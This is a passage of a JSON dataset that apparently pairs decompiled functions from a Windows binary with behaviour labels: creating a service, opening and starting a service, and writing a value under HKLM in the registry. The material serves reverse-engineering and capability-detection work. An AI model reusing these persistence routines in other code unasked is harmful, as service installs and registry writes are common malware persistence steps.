            "get service handle",
            "create service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004021f0) overlaps instruction at (ram,0x004021ef)\n// \n\nuint __cdecl fcn.00402190(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint *unaff_EDI;\n    bool bVar2;\n    bool in_SF;\n    float10 in_ST0;\n    unkbyte6 Var3;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    if ((!in_SF) && (in_SF)) {\n        *(unaff_EDI + 7) = in_ST0;\n        unaff_EDI = unaff_EDI + 5;\n    }\n    uStack8 = 0;\n    uStack12 = 0;\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = arg_10h;\n    uStack28 = 1;\n    uStack32 = 0;\n    uStack36 = 1;\n    uStack40 = 0xf01ff;\n    uStack44 = arg_ch;\n    uStack48 = arg_ch;\n    uStack52 = arg_8h;\n    Var3 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)();\n    bVar2 = Var3 == 0;\n    if (!bVar2) {\n        if ((!bVar2) && (bVar2)) {\n            uVar1 = in(Var3 >> 0x20);\n            *unaff_EDI = uVar1;\n            if (0 < &uStack52) {\n                *0xdee0000f = *0xdee0000f ^ Var3 >> 0x20;\n                return 1;\n            }\n            unaff_EDI[1] = 0;\n            return 0;\n        }\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(Var3);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 482
    },
    "00404af0": {
        "rules": [
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404af0(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 242
    },
    "00402cf0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00402cf0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071f0, 0x407234, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 80
    }
}